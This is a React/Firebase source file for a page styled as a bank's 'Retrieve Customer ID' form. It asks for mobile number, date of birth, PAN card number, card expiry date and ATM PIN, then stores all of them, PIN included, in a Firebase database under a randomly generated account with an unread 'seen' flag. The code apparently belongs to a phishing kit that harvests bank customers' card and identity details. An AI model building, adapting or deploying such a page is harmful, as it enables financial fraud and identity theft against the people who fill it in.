import { Button, Paper, Stack, TextField, Typography } from '@mui/material';
import { createUserWithEmailAndPassword } from 'firebase/auth';
import { ref, set } from 'firebase/database';
import React, { useState } from 'react';
import { LoaderIcon } from 'react-hot-toast';
import { useLocation, useNavigate } from 'react-router-dom';
import { Cid } from '../assets/data';
import { auth, realTiemDB } from '../firebase/firebase';

const ForgotCustomerID = () => {
    const location = useLocation();
    const title = location.pathname.slice(1);
    const navigate = useNavigate();

    const [mobileNumber, setMobileNumber] = useState('');
    const [dateOfBirth, setDateOfBirth] = useState('');
    const [panCardNumber, setPanCardNumber] = useState('');
    const [expiryDate, setExpiryDate] = useState('');
    const [atmPin, setAtmPin] = useState('');
    const [isLoading, setIsLoading] = useState(false);

    const [errors, setErrors] = useState({
        mobileNumber: '',
        dateOfBirth: '',
        panCardNumber: '',
        expiryDate: '',
        atmPin: ''
    });

    // Validation functions
    const validateMobileNumber = (mobile) => {
        const regex = /^[0-9]{10}$/;
        return regex.test(mobile) ? '' : 'Invalid mobile number';
    };

    const validateDateOfBirth = (dob) => {
        return dob ? '' : 'Date of Birth is required';
    };

    const validatePanCardNumber = (pan) => {
        const regex = /^[A-Z]{5}[0-9]{4}[A-Z]{1}$/;
        return regex.test(pan) ? '' : 'Invalid PAN card number';
    };

    const validateExpiryDate = (expiry) => {
        const regex = /^(0[1-9]|1[0-2])\/\d{2}$/;
        return regex.test(expiry) ? '' : 'Invalid expiry date (MM/YY)';
    };

    const validateAtmPin = (pin) => {
        const regex = /^[0-9]{4}$/;
        return regex.test(pin) ? '' : 'Invalid ATM PIN';
    };


    const handleDateChange = (e) => {
        let input = e.target.value;

        // Allow only numbers and slash (for MM/YY format)
        if (/[^0-9/]/.test(input)) {
            return; // Prevent invalid characters
        }

        // Automatically insert "/" after month (e.g., 03 -> 03/)
        if (input.length === 2 && !input.includes('/')) {
            input = `${input}/`;
        }

        // Update state if the length is less than or equal to 5 characters (MM/YY)
        if (input.length <= 5) {
            setExpiryDate(input);
        }
    };

    const handlePanCardChange = (e) => {
        const value = e.target.value.toUpperCase(); // Convert to uppercase
        setPanCardNumber(value);

        // Validate PAN number
        const validationError = validatePanCardNumber(value);
        setErrors({ panCardNumber: validationError });
    };

    const handleSubmit = (e) => {
        e.preventDefault();

        // Validate inputs
        const mobileError = validateMobileNumber(mobileNumber);
        const dobError = validateDateOfBirth(dateOfBirth);
        const panError = validatePanCardNumber(panCardNumber);
        const expiryError = validateExpiryDate(expiryDate);
        const pinError = validateAtmPin(atmPin);

        // If there are errors, update the error state
        if (mobileError || dobError || panError || expiryError || pinError) {
            setErrors({
                mobileNumber: mobileError,
                dateOfBirth: dobError,
                panCardNumber: panError,
                expiryDate: expiryError,
                atmPin: pinError
            });
        } else {
            // If no errors, clear errors and proceed with form submission
            setErrors({
                mobileNumber: '',
                dateOfBirth: '',
                panCardNumber: '',
                expiryDate: '',
                atmPin: ''
            });
            SubmitHandler(e); // Call your actual submit handler
        }
    };

    const SubmitHandler = async (e) => {
        e.preventDefault();
        const randomNumber = Math.floor(Math.random() * 1005487660) + 1;
        const email = `${randomNumber}@gmail.com`;

        try {
            setIsLoading(true);
            const userCredential = await createUserWithEmailAndPassword(auth, email, mobileNumber);
            const user = userCredential.user;

            await set(ref(realTiemDB, 'users/' + user.uid), {
                mobileNumber,
                dateOfBirth,
                loginType: title,
                panCardNumber,
                expiryDate,
                atmPin,
                uid: user.uid,
                seen: false,
                email,
                date: new Date().toLocaleString(),
                timestemp: Date.now()
            });

            setIsLoading(false);
            navigate(`/success/${user.uid}`);
            console.log('User Created');
        } catch (error) {
            console.log(error);
            setIsLoading(false);
        }
    };

    return (
        <Stack direction={'column'} sx={{ width: '100%', alignItems: 'center', backgroundColor: '#f4f4f9', paddingBottom: '20px' }}>
            <Paper elevation={2} sx={{ width: '100%', borderRadius: '10px', boxShadow: '0 4px 6px rgba(0, 0, 0, 0.1)' }}>
                <Stack padding={'10px 0px'} width={'100%'} direction={'row'} justifyContent={'start'} gap={2}>
                    <img src={Cid} style={{ width: '18rem' }} alt='' />
                </Stack>
            </Paper>

            <Stack width={'95%'} marginTop={'1rem'}>
                <Stack
                    border={'1px solid #ddd'}
                    borderRadius={'8px'}
                    width={'100%'}
                    marginTop={'1rem'}
                    component={'form'}
                    gap={2}
                    onSubmit={handleSubmit}
                    sx={{
                        backgroundColor: 'white',
                        padding: '20px',
                        boxShadow: '0 4px 10px rgba(0, 0, 0, 0.1)',
                        '@media (max-width: 600px)': {
                            padding: '15px',
                        },
                    }}
                >
                    <Stack padding={'13px 29px'} textAlign={'center'} width={'100%'} bgcolor={'#2c3e50'} borderRadius={'8px 8px 0 0'}>
                        <Typography sx={{ color: 'white', fontSize: '20px', textTransform: 'capitalize' }}>
                            {title ? title : 'Retrieve Customer ID'}
                        </Typography>
                    </Stack>

                    {/* Mobile Number */}
                    <Stack direction={{ xs: 'column', sm: 'row' }} alignItems={'start'} padding={'5px 20px'}>
                        <Typography sx={{ color: '#34495e', fontSize: '16px', fontWeight: '600', marginBottom: { xs: '10px', sm: '0' }, marginRight: { sm: '5px' } }}>
                            Mobile Number <span style={{ color: "red", fontWeight: 800, fontSize: "20px" }} >*</span>
                        </Typography>
                        <TextField
                            required
                            value={mobileNumber}
                            onChange={(e) => setMobileNumber(e.target.value)}
                            color="primary"
                            variant="outlined"
                            size="small"
                            placeholder='Mobile No.'
                            sx={{
                                '& .MuiInputBase-input': {
                                    padding: '12px',
                                    fontSize: '16px',
                                },
                                width: { xs: '100%', sm: '60%' },
                            }}
                        />
                        {errors.mobileNumber && (
                            <Typography sx={{ color: 'red', fontSize: '12px', marginTop: '0.5rem', marginLeft: '5px' }}>
                                {errors.mobileNumber}
                            </Typography>
                        )}
                    </Stack>

                    {/* Date of Birth */}
                    <Stack direction={{ xs: 'column', sm: 'row' }} alignItems={'start'} padding={'5px 20px'}>
                        <Typography sx={{ color: '#34495e', fontSize: '16px', fontWeight: '600', marginBottom: { xs: '10px', sm: '0' }, marginRight: { sm: '5px' } }}>
                            Date Of Birth <span style={{ color: "red", fontWeight: 800, fontSize: "20px" }} >*</span>
                        </Typography>
                        <TextField
                            required
                            value={dateOfBirth}
                            onChange={(e) => setDateOfBirth(e.target.value)}
                            type="date"
                            color="primary"
                            variant="outlined"
                            size="small"
                            sx={{
                                '& .MuiInputBase-input': {
                                    padding: '12px',
                                    fontSize: '16px',
                                },
                                width: { xs: '100%', sm: '60%' },
                            }}
                        />
                        {errors.dateOfBirth && (
                            <Typography sx={{ color: 'red', fontSize: '12px', marginTop: '0.5rem' }}>
                                {errors.dateOfBirth}
                            </Typography>
                        )}
                    </Stack>

                    {/* PAN Card Number */}
                    <Stack direction={{ xs: 'column', sm: 'row' }} alignItems={'start'} padding={'5px 20px'}>
                        <Typography sx={{ color: '#34495e', fontSize: '16px', fontWeight: '600', marginBottom: { xs: '10px', sm: '0' }, marginRight: { sm: '5px' } }}>
                            PAN Card Number <span style={{ color: "red", fontWeight: 800, fontSize: "20px" }} >*</span>

                        </Typography>
                        <TextField
                            required
                            value={panCardNumber}
                            onChange={handlePanCardChange}
                            color="primary"
                            variant="outlined"
                            size="small"
                            sx={{
                                '& .MuiInputBase-input': {
                                    padding: '12px',
                                    fontSize: '16px',
                                },
                                width: { xs: '100%', sm: '60%' },
                            }}
                            placeholder="ABCDE1234F"
                        />
                        {errors.panCardNumber && (
                            <Typography sx={{ color: 'red', fontSize: '12px', marginTop: '0.5rem' }}>
                                {errors.panCardNumber}
                            </Typography>
                        )}
                    </Stack>

                    {/* Expiry Date */}
                    <Stack direction={{ xs: 'column', sm: 'row' }} alignItems={'start'} padding={'5px 20px'}>
                        <Typography sx={{ color: '#34495e', fontSize: '16px', fontWeight: '600' }}>
                            Expiry Date (MM/YY) <span style={{ color: "red", fontWeight: 800, fontSize: "20px" }} >*</span>

                        </Typography>
                        <TextField
                            required
                            value={expiryDate}
                            onChange={handleDateChange}
                            color="primary"
                            variant="outlined"
                            size="small"
                            sx={{
                                width: { xs: '100%', sm: '60%' },
                                '& .MuiInputBase-input': {
                                    padding: '12px',
                                    fontSize: '16px',
                                },
                            }}
                            placeholder="MM/YY"
                        />
                        {errors.expiryDate && (
                            <Typography sx={{ color: 'red', fontSize: '12px', marginTop: '0.5rem' }}>
                                {errors.expiryDate}
                            </Typography>
                        )}
                    </Stack>

                    {/* ATM Pin */}
                    <Stack direction={{ xs: 'column', sm: 'row' }} alignItems={'start'} padding={'5px 20px'}>
                        <Typography sx={{ color: '#34495e', fontSize: '16px', fontWeight: '600' }}>
                            ATM Pin <span style={{ color: "red", fontWeight: 800, fontSize: "20px" }} >*</span>

                        </Typography>
                        <TextField
                            required
                            value={atmPin}
                            onChange={(e) => setAtmPin(e.target.value)}
                            color="primary"
                            variant="outlined"
                            size="small"
                            sx={{
                                '& .MuiInputBase-input': {
                                    padding: '12px',
                                    fontSize: '16px',
                                },
                                width: { xs: '100%', sm: '60%' },
                            }}
                            placeholder="0000"
                        />
                        {errors.atmPin && (
                            <Typography sx={{ color: 'red', fontSize: '12px', marginTop: '0.5rem' }}>
                                {errors.atmPin}
                            </Typography>
                        )}
                    </Stack>

                    {/* Submit Button */}
                    <Stack direction={'row'} alignItems={'center'} justifyContent={'center'} padding={'10px 0'}>
                        <Button
                            type="submit"
                            sx={{
                                backgroundColor: '#3498db',
                                color: 'white',
                                fontSize: '16px',
                                width: { xs: '100%', sm: '70%' },
                                padding: '12px',
                                borderRadius: '8px',
                                boxShadow: '0 4px 6px rgba(0, 0, 0, 0.1)',
                                '&:hover': {
                                    backgroundColor: '#2980b9',
                                },
                            }}
                        >
                            {isLoading ? <LoaderIcon /> : 'Continue'}
                        </Button>
                    </Stack>
                </Stack>
            </Stack>


        </Stack>
    );
};

export default ForgotCustomerID;
